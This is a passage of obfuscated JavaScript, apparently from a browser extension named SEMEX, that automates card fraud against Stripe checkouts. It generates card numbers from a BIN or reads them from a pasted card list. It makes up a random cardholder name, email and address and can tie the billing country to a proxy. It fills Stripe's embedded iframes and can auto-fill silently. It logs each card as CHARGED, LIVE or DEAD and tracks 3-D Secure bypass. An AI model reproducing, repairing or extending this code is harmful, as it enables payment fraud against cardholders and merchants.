Rosa","Ferretti","Bellini","Basile","Riva","Romani","Donati","Piras","Ruggiero","Montanaro","D'amico","Tanaka","Suzuki","Sato","Takahashi","Watanabe","Yamamoto","Nakamura","Kobayashi","Kato","Yoshida","Yamada","Sasaki","Yamaguchi","Saito","Matsumoto","Inoue","Kimura","Hayashi","Shimizu","Yamazaki","Mori","Abe","Ikeda","Hashimoto","Yamashita","Ishikawa","Nakajima","Maeda","Fujita","Ogawa","Goto","Okada","Hasegawa","Murakami","Kondo","Endo","Sakamoto","Ito","Nishimura","Fukuda","Ota","Miura","Fujiwara","Okamoto","Matsuda","Nakagawa","Harada","Ono","Tamura","Takeuchi","Kaneko","Wada","Nakano","Nakayama","Ishida","Ueda","Morita","Hara","Shibata","Sakurai","Fujii","Maruyama","Hirano","Otsuka","Shimada","Kudo","Miyamoto","Nakahara","Kubota","Miyazaki","Oshima","Takagi","Aoki","Honda","Iwasaki","Sakai","Kawasaki","Nomura","Terada","Sugimoto","Nishiyama","Furukawa","Murata","Nagai","Matsui","Uchida","Okazaki","Arai","Oba","Takeda","Wang","Li","Zhang","Liu","Chen","Yang","Huang","Zhao","Wu","Zhou","Xu","Sun","Ma","Zhu","Hu","Guo","He","Gao","Lin","Luo","Zheng","Liang","Xie","Song","Tang","Han","Feng","Deng","Cao","Peng","Huang","Yuan","Pan","Jiang","Cai","Lu","Wei","Qian","Fang","Du","Jin","Ding","Ye","Yu","Tan","Shen","Xiao","Dong","Zeng","Cheng","Xiong","Su","Yan","Ruan","Wen","Zou","Xia","Shi","Liao","Cui","Zhong","Kang","Mao","Gong","Fu","Wan","Liu","Wang","Chang","Qi","Qin","Hao","Hou","Guan","Meng","Bai","Kong","Gu","Hou","Kang","Tian","Long","Chu","Wan","Duan","Qian","Tang","Yin","Li","Yi","Shao","Mao","Pei","Chen","Niu","Xing","Jia","Jiang","Cheng","Zong","Gan","Mu","Zhan","Hua","Dou","Qi","Bao","Huo","Qu","Geng","Nie","Wen","Ai","Hong","Mei","Zhuang","Yan","Leng","Bian","Min","Piao","Sun","Zhuo","Zhang","Wang","Li","Kim","Park","Lee","Choi","Jung","Kang","Cho","Yoon","Shin","Lim","Han","Oh","Seo","Kwon","Hwang","Ahn","Song","Hong","Jeon","Ko","Moon","Yang","Bae","Baek","Seok","Nam","Min","Gu","Ha","Jeong","Cha","Jin","Yoo","Ryu","Sim","Son","No","Byun","Jang","Sung","Chun","Hwangbo","Gong","Bang","Yeom","Im","Pyo","Woo","Mok","Ok","Soh","Tak","Eom","Maeng","Geum","Myeong","Beom","Seol","Sagong","Bok","Hyun","Uhm","Pung","Sa","Yeop","Gal","Wi","So","Ong","Yang","Dam","Gyo","Bi","Chae","Uk","Eun","Pil","Man","Gyun","Dae","Ra","Du","Ma","Pyo","Won","Yo","In","Jik","Hwan","Bo","Hwa","Gi","Sin","Yeo","Gye","Bun","Jwa","Haeng","Hak","Gyu","Pyeong","Dal","Che","Pyun","Seup","Muk","Chu","Mi","Bong","Jang","Hyeon","Yeong","O","Jon","Sun","Eung","Gap","Su","Pan","Ryeom","Hui","Gung","Yu","Tae","Nang","Dokgo","Dongbang","Mangjeol","Sagong","Seo Woo","Sunwoo","Eugene","Yokoyama","Kadoi","Yeon","Ho","Kuk","Mae","Ba","Hae","Heo","Jin","Bing","Gak","Jun","Jeon","Gwang","Jeok","Chi","Rim","Somun","Jegal","Seonu","Hwabo","Jin","Jeo","Dan","Poong","Sip","Ye","Sobong","Maehwa","Dong","Hyeop","Gyeon","Pung","Jin","Hong","Gwon","Dae","Hyang","Ahn","Ho","Jang","Dong","Du","Dan","Mun","Sa","Seo","U","Woong","Un","Jang","Jeong","Chu","Geum","Na","Nang","Nae","Noe","Dang","Deok","Ra","Ro","Ryoo","Ri","Min","Ban","Bang","Byeon","Seong","Sin","Ahn","Yang","Eom","Yeo","Yeon","Yeom","Ye","O","Yong","U","Won","Yu","Yun","Eun","Lee","Lim","Jang","Jeon","Jeong","Jo","Jin","Cha","Chang","Chae","Cheon","Choe","Chu","Tak","Pyeong","Pyo","Pung","Pi","Ha","Han","Hye","Hong","Hwa","Hwang","Hu"];
      const _SEMEX_RND_EMAIL_DOMAINS = ["gmail.com","outlook.com","yahoo.com","icloud.com","proton.me","aol.com","hotmail.com"];
      const _semexPick = _0xarr => _0xarr[Math.floor(Math.random() * _0xarr.length)];
      const _semexRand = _0xchars => {
        let _0xs = "";
        for (let _0xi = 0; _0xi < _0xchars; _0xi++) _0xs += "abcdefghijklmnopqrstuvwxyz0123456789"[Math.floor(Math.random() * 36)];
        return _0xs;
      };
      let _0x51ab10 = "support@semex.pro";
      let _0x420273;
      // Name priority: fixed customName (only when randomName toggle is OFF) → random (default).
      // "SEMEX" is never used as a cardholder name. If no custom name is set, a fresh
      // random identity is always generated so every fill looks natural.
      if (_0x4e07a9.customName && _0x4e07a9.customName.trim() && !_0x4e07a9.randomName) {
        _0x420273 = _0x4e07a9.customName.trim();
      } else {
        // Random name — middle initial + optional hyphenated surname (≈ 45M combos).
        let _semexFn = _semexPick(_SEMEX_RND_FIRST), _semexLn = _semexPick(_SEMEX_RND_LAST);
        if (Math.random() < 0.35) { let _semexS = _semexPick(_SEMEX_RND_LAST); if (_semexS === _semexLn) _semexS = _semexPick(_SEMEX_RND_LAST); _semexLn += "-" + _semexS; }
        if (Math.random() < 0.4) _semexFn += " " + String.fromCharCode(65 + Math.floor(Math.random() * 26)) + ".";
        _0x420273 = _semexFn + " " + _semexLn;
      }
      if (_0x4e07a9.randomEmail) {
        // Derive a plausible email from the chosen identity (falls back to a
        // random handle when Random Name is off but Random Email is on).
        const _semexNameForEmail = _0x420273 !== "SEMEX" ? _0x420273.toLowerCase().replace(/[^a-z ]/g, "").replace(/\s+/g, ".") : _semexRand(8);
        _0x51ab10 = _semexNameForEmail + _semexRand(3) + "@" + _semexPick(_SEMEX_RND_EMAIL_DOMAINS);
      } else if (_0x4e07a9.customEmail && _0x4e07a9.customEmail.includes("@")) {
        _0x51ab10 = _0x4e07a9.customEmail;
      }
      const _0x4cbf7c = {
        country: ((_0x1222f8 = _0x545bc6.address) == null ? undefined : _0x1222f8.countryCode) || _0x545bc6.country || "US",
        countryCode: ((_0xf11480 = _0x545bc6.address) == null ? undefined : _0xf11480.countryCode) || _0x545bc6.country || "US",
        zip: ((_0x448fcb = _0x545bc6.address) == null ? undefined : _0x448fcb.zip) || ((_0x3913e2 = _0x545bc6.address) == null ? undefined : _0x3913e2.postalCode) || "10001",
        postalCode: ((_0x448fcb = _0x545bc6.address) == null ? undefined : _0x448fcb.zip) || ((_0x3913e2 = _0x545bc6.address) == null ? undefined : _0x3913e2.postalCode) || "10001",
        city: ((_0x3a5b6b = _0x545bc6.address) == null ? undefined : _0x3a5b6b.city) || "New York",
        state: ((_0x2b32ff = _0x545bc6.address) == null ? undefined : _0x2b32ff.state) || "",
        address: ((_0xdcfe8d = _0x545bc6.address) == null ? undefined : _0xdcfe8d.street) || ((_0x2186d5 = _0x545bc6.address) == null ? undefined : _0x2186d5.line1) || "123 Main St",
        address2: ((_0x535d24 = _0x545bc6.address) == null ? undefined : _0x535d24.line2) || "",
        phone: ((_0x20f8ef = _0x545bc6.address) == null ? undefined : _0x20f8ef.phone) || "",
        email: _0x51ab10,
        name: _0x420273,
        firstName: _0x420273.split(" ")[0] || "SEMEX",
        lastName: _0x420273.split(" ").slice(1).join(" ") || "Automation"
      };
      // NEW v4.1.5: Random address — overwrite address fields when the toggle is on.
      // Country priority: BIN card country → addressCountry setting → current value.
      if (_0x4e07a9.randomAddress) {
        // Address mode: "bin" (default) = BIN card country, "ip" = proxy/IP country, "random" = random
        const _semexAddrMode = _0x4159f5.addressMode || "bin";
        let _semexRandCty = "US";
        if (_semexAddrMode === "ip") {
          try {
            const _semexIpPs = (await Promise.race([
              new Promise(_semexR => { try { chrome.storage.local.get(["proxyState"], _semexR); } catch (_eP) { _semexR({}); } }),
              new Promise(_semexR => setTimeout(() => _semexR(null), 1500))
            ])) || {};
            _semexRandCty = ((_semexIpPs.proxyState && _semexIpPs.proxyState.countryCode) || "US").toUpperCase();
          } catch (_semexAddrE) { _semexRandCty = "US"; }
        } else if (_semexAddrMode === "random") {
          const _semexAddrPool = ["US","GB","CA","AU","DE","FR","NL","SE","NO","DK","JP","BR","IN","SG","NZ"];
          _semexRandCty = _semexAddrPool[Math.floor(Math.random() * _semexAddrPool.length)];
        } else if (_semexAddrMode === "custom") {
          // Pixel Zero "Keep Country" parity: operator-pinned billing country
          // (customCountryCode setting, 2-letter ISO). Falls back to US.
          _semexRandCty = String(_0x4159f5.customCountryCode || "US").toUpperCase().replace(/[^A-Z]/g, "").slice(0, 2) || "US";
        } else {
          // "bin" — use BIN/card country as before
          const _semexBinCty = (_0x395d27 && (_0x395d27.country || _0x395d27.countryCode || _0x395d27.country_code)) || "";
          _semexRandCty = (_semexBinCty || _0x4159f5.addressCountry || _0x4cbf7c.countryCode || "US").toUpperCase();
        }
        const _semexRandAddr = _semexGenRandomAddress(_semexRandCty);
        _0x4cbf7c.address    = _semexRandAddr.address;
        _0x4cbf7c.address2   = _semexRandAddr.address2;
        _0x4cbf7c.city       = _semexRandAddr.city;
        _0x4cbf7c.state      = _semexRandAddr.state;
        _0x4cbf7c.zip        = _semexRandAddr.zip;
        _0x4cbf7c.postalCode = _semexRandAddr.zip;
        _0x4cbf7c.country    = _semexRandAddr.country;
        _0x4cbf7c.countryCode = _semexRandAddr.countryCode;
      }
      if (_0x395d27 && _0x395d27.number) {
        _0x4cbf7c.cardNumber = _0x395d27.number;
        const _semexExpM = String(_0x395d27.month || _0x395d27.exp_month || "").padStart(2, "0");
        const _semexExpY = String(_0x395d27.year || _0x395d27.exp_year || "").slice(-2);
        _0x4cbf7c.expiry = _semexExpM + "/" + _semexExpY;
        // Separate month/year keys — multiple naming conventions used across gateways.
        // expMonth/expYear: Xsolla, Recurly, legacy.
        // expiryMonth/expiryYear: habanero split-expiry variant (#Field-expiryMonthInput).
        _0x4cbf7c.expMonth     = _semexExpM;
        _0x4cbf7c.expYear      = _semexExpY;
        _0x4cbf7c.expiryMonth  = _semexExpM;
        _0x4cbf7c.expiryYear   = _semexExpY;
        _0x4cbf7c.cvv = _0x395d27.cvv || _0x395d27.cvc || "";
      }
      // Defensive unwrap: getSelectors() returns {selectors, delays, iframe}
      // and cache entries written before the background fix stored that wrapper
      // under "selectors" — every field key came out undefined, so fillForm
      // silently no-op'd and the overlay sat on "Waiting response..." with an
      // empty form. Fail loudly instead of faking success.
      let _0xsel = _0x545bc6.selectors;
      if (_0xsel && !_0xsel.cardNumber && _0xsel.selectors) _0xsel = _0xsel.selectors;
      // On merchant pages with an embedded Stripe Payment Element or Embedded
      // Checkout, the card form lives inside a js.stripe.com iframe — NOT in the
      // merchant's own DOM. The server config is keyed by merchant domain and
      // returns merchant-specific selectors that don't exist inside Stripe's iframe.
      // Override with the canonical Stripe selectors so the subframe fill always
      // reaches the real card inputs regardless of Stripe UI version:
      //   habanero (#Field-*Input), classic PaymentElement (#cardNumber/Expiry/Cvc),
      //   Embedded Checkout, and individual CardElements.
      const _semexMerchantStripeHost = ["checkout.stripe.com","pay.stripe.com","buy.stripe.com","donate.stripe.com","invoice.stripe.com","billing.stripe.com"].includes((window.location.hostname||"").toLowerCase());
      // Detect any js.stripe.com card/checkout iframe regardless of host.
      const _semexHasElementsFrame = Array.from(document.querySelectorAll("iframe")).some(function(_f){
        const _s=_f.src||"";
        return _s.includes("js.stripe.com")&&(_s.includes("elements-inner")||_s.includes("embedded-checkout-inner"));
      });
      // Merchant pages with embedded Stripe: card form is cross-origin inside the Stripe iframe.
      const _semexIsEmbeddedStripe = !_semexMerchantStripeHost && _semexHasElementsFrame;
      // Stripe payment links (buy.stripe.com/pay/...) also render card fields inside
      // elements-inner — they are NOT /g/pay/ or /c/pay/ but need the same iframe-fill path.
      const _semexIsStripePayLink = _semexMerchantStripeHost && _semexHasElementsFrame &&
        !window.location.pathname.startsWith("/g/pay/") &&
        !window.location.pathname.startsWith("/c/pay/");
      // Canonical Stripe selectors work inside all elements-inner iframe variants:
      // habanero (#Field-*Input), classic (#cardNumber/Expiry/Cvc), Embedded Checkout.
      // Canonical Stripe selectors — habanero (#Field-*Input) first, classic PaymentElement fallback.
      // expiryMonth/expiryYear cover the split-expiry variant used by some habanero sessions.
      // postalCode/country/address fill billing fields present on many /c/pay/ and /g/pay/ forms.
      const _semexCanonicalStripeSel = {
        email:       "#email, input[name='email'], input[autocomplete='email'], input[type='email']",
        cardNumber:  "#Field-numberInput, #cardNumber, [data-elements-stable-field-name='cardNumber'], input[autocomplete='cc-number']",
        expiry:      "#Field-expiryInput, #cardExpiry, [data-elements-stable-field-name='cardExpiry'], input[autocomplete='cc-exp']",
        expiryMonth: "#Field-expiryMonthInput, [data-elements-stable-field-name='cardExpiryMonth'], input[autocomplete='cc-exp-month']",
        expiryYear:  "#Field-expiryYearInput, [data-elements-stable-field-name='cardExpiryYear'], input[autocomplete='cc-exp-year']",
        cvv:         "#Field-cvcInput, #cardCvc, [data-elements-stable-field-name='cardCvc'], input[autocomplete='cc-csc']",
        name:        "#Field-nameInput, #billingName, [data-elements-stable-field-name='billingName'], input[autocomplete='cc-name']",
        postalCode:  "#Field-postalCodeInput, #billingPostalCode, [data-elements-stable-field-name='postalCode'], input[autocomplete='postal-code'], input[name='postalCode']",
        country:     "#Field-countryInput, #billingCountry, select[data-elements-stable-field-name='country'], select[name='country'], select[autocomplete='country']",
        address:     "#Field-addressLine1Input, [data-elements-stable-field-name='addressLine1'], input[autocomplete='address-line1']",
        terms:       "#termsOfServiceConsentCheckbox, input[name='termsOfServiceConsent']"
      };
      if (_semexIsEmbeddedStripe || _semexIsStripePayLink) {
        // Both merchant-embedded and payment-link paths: card form is inside
        // elements-inner, so use canonical Stripe selectors and route to FILL_FORM_SUBFRAMES.
        _0xsel = _semexCanonicalStripeSel;
      } else if (_semexMerchantStripeHost && (
        window.location.pathname.startsWith("/g/pay/") ||
        window.location.pathname.startsWith("/c/pay/")
      )) {
        // Stripe-hosted new-UI (/g/pay/ or /c/pay/) — the card form renders inside
        // the elements-inner-habanero iframe. Server config may carry classic selectors
        // (#cardNumber, #cardExpiry, #cardCvc) that no longer exist in the habanero DOM.
        // Prepend canonical habanero selectors so they are tried first; classic selectors
        // remain as comma-separated fallbacks for older /c/pay/ sessions.
        const _semexMergeHab = (habSel, cfgSel) => {
          if (!cfgSel) return habSel;
          // Avoid duplicating the habanero selector if the server already provides it.
          if (cfgSel.includes(habSel.split(",")[0].trim())) return cfgSel;
          return habSel + ", " + cfgSel;
        };
        _0xsel = {
          email:      _semexMergeHab("#email, input[name='email'], input[autocomplete='email'], input[type='email']", _0xsel.email),
          cardNumber: _semexMergeHab("#Field-numberInput, #cardNumber, [data-elements-stable-field-name='cardNumber'], input[autocomplete='cc-number']", _0xsel.cardNumber),
          expiry:       _semexMergeHab("#Field-expiryInput, #cardExpiry, [data-elements-stable-field-name='cardExpiry'], input[autocomplete='cc-exp']", _0xsel.expiry),
          expiryMonth:  _semexMergeHab("#Field-expiryMonthInput, [data-elements-stable-field-name='cardExpiryMonth'], input[autocomplete='cc-exp-month']", _0xsel.expiryMonth),
          expiryYear:   _semexMergeHab("#Field-expiryYearInput, [data-elements-stable-field-name='cardExpiryYear'], input[autocomplete='cc-exp-year']", _0xsel.expiryYear),
          cvv:          _semexMergeHab("#Field-cvcInput, #cardCvc, [data-elements-stable-field-name='cardCvc'], input[autocomplete='cc-csc']", _0xsel.cvv),
          name:         _semexMergeHab("#Field-nameInput, #billingName, [data-elements-stable-field-name='billingName'], input[autocomplete='cc-name']", _0xsel.name),
          postalCode:   _semexMergeHab("#Field-postalCodeInput, #billingPostalCode, [data-elements-stable-field-name='postalCode'], input[autocomplete='postal-code']", _0xsel.postalCode),
          country:      _semexMergeHab("#Field-countryInput, #billingCountry, select[data-elements-stable-field-name='country'], select[name='country']", _0xsel.country),
          address:      _semexMergeHab("#Field-addressLine1Input, [data-elements-stable-field-name='addressLine1'], input[autocomplete='address-line1']", _0xsel.address),
          terms:        _semexMergeHab("#termsOfServiceConsentCheckbox, input[name='termsOfServiceConsent']", _0xsel.terms),
          // Pass through remaining gateway-specific keys unchanged; exclude all
          // keys that have been explicitly merged above to avoid double-entries.
          ...Object.fromEntries(Object.entries(_0xsel).filter(([k]) => !["email","cardNumber","expiry","expiryMonth","expiryYear","cvv","name","postalCode","country","address","terms"].includes(k)))
        };
      } else if (!_0xsel || !_0xsel.cardNumber) {
        try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "config_unavailable" }, "*"); } catch (_eBad) {}
        return;
      }
      const _0x595382 = {
        selectors: _0xsel,
        values: _0x4cbf7c
      };
      // Merchant-embedded Stripe pages: the email field often lives on the
      // MERCHANT'S top frame (outside the Stripe iframe). The subframe fill
      // path covers card fields only, so the email gets skipped.
      // Fill it directly on the top frame before dispatching to subframes.
      try {
        if (window === window.top) {
          const _semexHasEmbedFrame = Array.from(document.querySelectorAll("iframe")).some(function(_f) {
            const _s = _f.src || "";
            return _s.includes("js.stripe.com") && (_s.includes("elements-inner") || _s.includes("embedded-checkout-inner"));
          });
          if (_semexHasEmbedFrame) {
            // Dismiss any Stripe Link saved-payment UI on the top frame before
            // attempting the email fill — Stripe Link may have surfaced a
            // "Use a different card" banner here as well as inside the iframe.
            try { await dismissStripeLinkSavedPayment(); } catch (_semexDSE) {}
            const _semexEmailSels = [
              "input[type='email']", "input[name='email']",
              "input[autocomplete='email']", "input[id*='email' i]",
              "input[placeholder*='email' i]", "input[data-testid*='email' i]"
            ];
            for (const _semexSel of _semexEmailSels) {
              try {
                const _semexEl = document.querySelector(_semexSel);
                if (_semexEl && !_semexEl.value && !_semexEl.disabled && !_semexEl.readOnly) {
                  const _semexNSD = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, "value");
                  if (_semexNSD && _semexNSD.set) _semexNSD.set.call(_semexEl, _0x4cbf7c.email);
                  else _semexEl.value = _0x4cbf7c.email;
                  // Use InputEvent(insertFromPaste) not generic Event — React/Stripe's
                  // synthetic event system ignores generic 'input' events (no inputType/data)
                  // and resets the field after reconciliation, silently clearing the email.
                  const _semexEmailVal = String(_0x4cbf7c.email || "");
                  try {
                    _semexEl.dispatchEvent(new InputEvent("input", { bubbles: true, cancelable: true, inputType: "insertFromPaste", data: _semexEmailVal }));
                  } catch (_eIE) {
                    _semexEl.dispatchEvent(new Event("input", { bubbles: true }));
                  }
                  _semexEl.dispatchEvent(new Event("change", { bubbles: true, cancelable: true }));
                  _semexEl.dispatchEvent(new Event("blur", { bubbles: true }));
                  break;
                }
              } catch (_semexEe) {}
            }
          }
        }
      } catch (_semexEmE) {}
      let _semexFillResult = await fillForm(_0x595382);
      const _0x5b60a8 = document.querySelector("[name=\"email\"], [autocomplete=\"email\"], input[type=\"email\"]");
      if (!_0x5b60a8 || !_0x5b60a8.value) {
        await new Promise(_0x5976f6 => setTimeout(_0x5976f6, 150));
        _semexFillResult = await fillForm(_0x595382);
      }
      // Only mark the page/card as "done" when the fill handler validated that
      // all required fields are actually non-empty (ok === true).
      // • null  → subframe path; result arrives async via relay; do NOT mark done
      //           here or a failed subframe fill would let the next retry hit the
      //           dedupe path and post ok:true without re-filling.
      // • {ok:false} → validation failure; don't mark done so the operator can
      //           retry with the same card and get a real fill attempt.
      // • {ok:true} → all required fields filled; safe to mark done.
      if (_semexFillResult && _semexFillResult.ok === true) {
        window.__SEMEX_FILLED_PAGES.add(_semexFillKey);
        window.__SEMEX_FILL_DONE_KEY = _semexFillKey;
      }
      // Completion ownership is single-source: executeFillSequence's finally
      // block (direct path), the subframe relay (new-UI / merchant-embedded),
      // or fillComponentFrame (component-frame path). Never post ok:true here.
      _0x1d29ad = true;
    }
    if (!_0x1d29ad) {
      // Config/cache never arrived — retrigger the fetch for next time AND
      // release the overlay from its waiting state with a visible error.
      safeSendMessage({
        type: "CHECK_CONFIG",
        domain: window.location.hostname,
        isStripeCheckout: window.IS_STRIPE_CHECKOUT || window.location.hostname === "checkout.stripe.com",
        force: true,
        card: _0x395d27 || null
      });
      try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "config_unavailable" }, "*"); } catch (_eCU) {}
    }
  } catch (_0x3007f9) {
    // BUGFIX: bare SEMEX_FILL_FORM_COMPLETE (no ok field) was treated as success
    // by the overlay (ok === false check never fired). Explicit ok:false now
    // surfaces a visible error instead of silently pretending the fill worked.
    try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "exception" }, "*"); } catch (_eEx) {}
  }
}
__name(fillFormFromOverlay, "fillFormFromOverlay");
// DEAD/LIVE history entries auto-expire after this window; CHARGED are kept forever.
const SEMEX_HISTORY_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours
function _semexIsChargedStatus(s) {
  const v = String(s || "").toLowerCase().replace(/^ccn_/, "");
  return v === "charged" || v === "success" || v === "approved";
}
function _semexPruneHistory(list) {
  const now = Date.now();
  return (list || []).filter((tx) => {
    if (_semexIsChargedStatus(tx && tx.status)) return true; // charged = permanent
    if (tx && tx.expiresAt) return now < tx.expiresAt;
    // legacy rows without expiresAt: expire by timestamp + TTL
    if (tx && tx.timestamp) return now < tx.timestamp + SEMEX_HISTORY_TTL_MS;
    return true;
  });
}
async function saveTransaction(_0x3724d6, _0xbcd986, _0x7e127b, _0x381a0f, _0x40f108, _0xextra) {
  try {
    const _0x1d9d6e = await chrome.storage.local.get(["__xtxh", "statistics"]);
    let _0x128fed = _semexPruneHistory(_0x1d9d6e.transactionHistory || []);
    let _0x498009 = _0x1d9d6e.statistics || {
      totalCards: 0,
      attempts: 0,
      charged: 0,
      ccnLive: 0,
      dead: 0
    };
    if (typeof _0x498009.attempts !== "number") {
      _0x498009.attempts = (_0x498009.charged || 0) + (_0x498009.ccnLive || 0) + (_0x498009.dead || 0);
    }
    let _0x42d138 = "N/A";
    if (_0x3724d6 && _0x3724d6.number) {
      _0x42d138 = _0x3724d6.number;
      if (_0x3724d6.month && _0x3724d6.year) {
        _0x42d138 += "|" + _0x3724d6.month + "|" + _0x3724d6.year;
      }
      if (_0x3724d6.cvv) {
        _0x42d138 += "|" + _0x3724d6.cvv;
      }
    }
    const _x = _0xextra || {};
    const _isCharged = _semexIsChargedStatus(_0xbcd986);
    const _0x1087e9 = {
      id: "tx_" + Date.now(),
      card: _0x42d138,
      status: _0xbcd986,
      site: _0x7e127b || window.location.hostname,
      gateway: _x.gateway || "Stripe",
      code: _0x381a0f || "",
      message: _0x40f108 || "",
      response: _x.response || _0x40f108 || "",
      amount: _x.amount || "",
      currency: _x.currency || "",
      threeDSBypassed: _x.threeDSBypassed || false,
      timestamp: Date.now(),
      // CHARGED never expires; everything else auto-deletes after TTL.
      expiresAt: _isCharged ? null : (Date.now() + SEMEX_HISTORY_TTL_MS)
    };
    _0x128fed.unshift(_0x1087e9);
    if (_0x128fed.length > 200) {
      _0x128fed = _0x128fed.slice(0, 200);
    }
    // "Attempts" = every try (charged + live + dead). Each status also keeps its own counter.
    _0x498009.attempts++;
    if (_isCharged) {
      _0x498009.totalCards++;
      _0x498009.charged++;
    } else if (_0xbcd986 === "CCN_LIVE" || _0xbcd986 === "LIVE") {
      _0x498009.ccnLive++;
    } else if (_0xbcd986 === "DEAD" || _0xbcd986 === "DECLINED") {
      _0x498009.dead++;
    }
    await chrome.storage.local.set({
      __xtxh: _0x128fed,
      statistics: _0x498009
    });
  } catch (_0x5e7907) {
    if (_0x5e7907.message.includes("Extension context invalidated")) {
      return;
    }
  }
}
__name(saveTransaction, "saveTransaction");
chrome.runtime.onMessage.addListener((_0x53f1b1, _0x3f46de, _0x163995) => {
  if (_0x53f1b1.type === "FILL_FORM") {
    // Propagate the actual fill result so the background's FILL_FORM_SUBFRAMES
    // handler can distinguish a successful card-field fill from a frame that
    // received the message but found no fillable fields (wrong selectors,
    // getMainFrameMatches crash, etc.). Previously always acked {success:true}
    // which caused the background to stop retrying even when the fill failed.
    fillForm(_0x53f1b1.payload)
      .then(result => _0x163995({ success: result && result.ok !== false, ok: result && result.ok }))
      .catch(err => _0x163995({ success: false, error: String(err) }));
    return true;
  }
  if (_0x53f1b1.type === "TRIGGER_SUBMIT") {
    // Routed here from the background's TRIGGER_SUBMIT_SUBFRAMES handler.
    // We are running inside the js.stripe.com elements-inner iframe where the
    // submit button actually lives — triggerStripeValidation() can find it here.
    // Call sendResponse inside .then() so the channel stays open until the
    // click completes — mirrors the FILL_FORM async pattern.
    // BUGFIX: previously always responded {success:true} regardless of whether
    // triggerStripeValidation found and clicked a button — the background retry
    // then stopped early thinking the submit succeeded when no button existed yet.
    // Now we propagate the actual return value (true = clicked, false = no button).
    triggerStripeValidation().then((clicked) => {
      if (_0x163995) _0x163995({ success: clicked === true });
    }).catch(() => {
      if (_0x163995) _0x163995({ success: false });
    });
    return true;
  }
  if (_0x53f1b1.type === "CLICK_PAY_WITHOUT_LINK") {
    // Background broadcasts this to every js.stripe.com frame when the
    // elements-inner iframe requests sibling-frame Link dismissal.
    // Whichever frame holds the "Pay without Link" button clicks it.
    clickPayWithoutLinkButton().then(function(_semexClicked) {
      if (_0x163995) _0x163995({ clicked: _semexClicked });
    }).catch(function() {
      if (_0x163995) _0x163995({ clicked: false });
    });
    return true;
  }
  if (_0x53f1b1.type === "CARD_DATA_CAPTURED") {
    const _0x521fb8 = _0x53f1b1.card;
    if (_0x521fb8 && _0x521fb8.number) {
      lastFilledCard = _0x521fb8;
      window.__LAST_CAPTURED_CARD = _0x521fb8;
      window.lastInterceptedCardData = _0x521fb8;
      chrome.storage.session.set({
        __xlcard: _0x521fb8
      }).catch(() => {});
    }
    return;
  }
  // Fill-completion relay: an iframe finished its fill (new UI) — surface it
  // to the overlay in THIS (top) frame.
  if (_0x53f1b1.type === "SEMEX_FILL_FORM_COMPLETE_RELAY") {
    if (window !== window.top) return;
    // Carry ok/error from the subframe's validation result through to the overlay.
    // Fail-closed: only accept explicit ok===true from the subframe; any other
    // value (undefined, null, false) is treated as failure.
    const _semexRelayOk = _0x53f1b1.ok === true;
    const _semexRelayErr = _semexRelayOk ? undefined : (_0x53f1b1.error || "fill_error");
    try {
      window.postMessage({
        type: "SEMEX_FILL_FORM_COMPLETE",
        ok: _semexRelayOk,
        error: _semexRelayErr
      }, "*");
    } catch (_eRC) {}
    return;
  }
  // Silent auto-fill: background sends this ~1 second after checkout detection
  // when formFilling.autoFill is enabled. No overlay is shown — we pick the
  // first card from storage and call fillFormFromOverlay directly.
  if (_0x53f1b1.type === "SEMEX_AUTO_FILL") {
    if (window !== window.top) return;
    // In-flight guard: auto-fill fires when a checkout page is detected.
    // Without this, rapid navigation or the interceptor firing twice can
    // launch two concurrent fills — the second overwrites the first's fields
    // mid-entry and both end up with garbage data. Cheap module-scoped flag.
    if (window.__semexAutoFillInFlight) return false;
    window.__semexAutoFillInFlight = true;
    (async () => {
      try {
        const _semexAfSt = await new Promise(_r => chrome.storage.local.get(["settings"], _r));
        const _semexAfS = (_semexAfSt && _semexAfSt.settings) || {};
        const _semexAfMode = (_semexAfS.binOrCCList && _semexAfS.binOrCCList.mode) || "bin";
        let _semexAfCard = null;
        if (_semexAfMode === "ccList") {
          const _semexAfCc = (_semexAfS.binOrCCList && _semexAfS.binOrCCList.ccList) || "";
          const _semexAfLines = _semexAfCc.split("\n").filter(_l => _l.trim().length > 0);
          if (_semexAfLines.length > 0) {
            const _semexAfParts = _semexAfLines[0].split("|");
            if (_semexAfParts.length >= 4) {
              _semexAfCard = {
                number: _semexAfParts[0].trim(),
                month: _semexAfParts[1].trim(),
                year: _semexAfParts[2].trim(),
                cvv: _semexAfParts[3].trim()
              };
            }
          }
        } else {
          // BIN mode: generate a card using the shared CardGenerator module
          // (injected into this isolated world before content.js by the manifest).
          const _semexAfBin = (_semexAfS.binOrCCList && _semexAfS.binOrCCList.bin) || "";
          const _semexAfGen = (typeof CardGenerator !== "undefined" && CardGenerator && typeof CardGenerator.generateCard === "function")
            ? CardGenerator.generateCard : null;
          if (_semexAfBin.length >= 6 && _semexAfGen) {
            // AMEX BINs (34/37) need 15 digits; all others need 16.
            const _semexAfBinD = _semexAfBin.replace(/\D/g, "");
            const _semexAfLen = (_semexAfBinD.startsWith("34") || _semexAfBinD.startsWith("37")) ? 15 : 16;
            _semexAfCard = _semexAfGen(_semexAfBin, _semexAfLen, "RND", "RND", "");
          }
        }
        await fillFormFromOverlay(_semexAfCard);
      } catch (_semexAfErr) {}
      finally { window.__semexAutoFillInFlight = false; }
    })();
    return false;
  }
  // Background couldn't deliver the fill to any Stripe subframe (new UI) —
  // /g/→/c/ fallback: if the payload was saved, try a direct DOM fill before
  // giving up. Covers cases where the elements-inner iframe wasn't enumerated
  // yet (race) or the page actually uses the old /c/ layout under a /g/ URL.
  if (_0x53f1b1.type === "SEMEX_FILL_FORM_SUBFRAMES_FAILED") {
    if (window !== window.top) return;
    const _semexFbP = window.__SEMEX_SUBFRAMES_PAYLOAD;
    if (_semexFbP) {
      delete window.__SEMEX_SUBFRAMES_PAYLOAD;
      (async () => {
        try {
          const _sel = _semexFbP.selectors;
          const _vals = _semexFbP.values;
          // Wait for card inputs directly in the DOM (/c/ path approach).
          const _found = (await waitForElement(_sel.cardNumber, 3000)) ||
                         (await waitForElement(_sel.country, 2000)) ||
                         (await waitForElement(".PaymentMethodFormAccordionItem", 1000));
          if (_found) {
            await executeFillSequence(_sel, _vals);
          } else {
            try { window.postMessage({ type: "SEMEX_FILL_FORM_COMPLETE", ok: false, error: "no_stripe_frame" }, "*"); } catch (_e) {}
          }
        } catch (_semexFbErr) {
